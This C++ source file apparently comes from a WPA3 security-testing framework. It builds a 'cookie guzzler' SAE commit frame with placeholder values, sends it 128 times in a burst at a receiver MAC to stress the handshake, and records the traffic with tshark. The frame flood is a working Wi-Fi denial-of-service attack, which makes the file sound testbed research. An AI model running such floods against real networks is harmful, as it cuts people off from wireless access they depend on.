#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "config/RunStatus.h"
#include <chrono>
#include <thread>

#include "attacks/DoS_hard/cookie_guzzler/cookie_guzzler.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester::test_sae_commit_monitor{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    void speed_observation_start(RunStatus &rs){
        const HWAddress<6> rx_mac(rs.get_actor("receiver")["mac"]);
        const HWAddress<6> tx_mac(rs.get_actor("transceiver")["mac"]);

        const string mac_filter = "(wlan host "+rx_mac.to_string()+" or wlan host "+tx_mac.to_string()+")";

        observer::start_tshark(rs, "receiver", mac_filter);
        observer::start_tshark(rs, "transceiver",  mac_filter);
    }

    void run_attack(RunStatus& rs){
        const HWAddress<6> rx_mac(rs.get_actor("receiver")["mac"]);
        const HWAddress<6> tx_mac(rs.get_actor("transceiver")["mac"]);
        speed_observation_start(rs);

        PacketSender sender(rs.get_actor("transceiver")["iface"]);
        this_thread::sleep_for(seconds(5));
        constexpr size_t BURST_SIZE = 128;
        dos_helpers::SAEPair sae_params{};
        sae_params.scalar = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
                           0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f};
        sae_params.element = {0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f,
                             0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f,
                             0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f,
                             0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f};
        auto cg_frame = cookie_guzzler::get_cookie_guzzler_frame(rx_mac, tx_mac, sae_params);
        for (size_t i = 0; i < BURST_SIZE; ++i) {sender.send(cg_frame);}
        this_thread::sleep_for(seconds(5));

    }

    void stats_attack(const RunStatus& rs){
        observer::tshark_graph(rs, "receiver");
    }
}
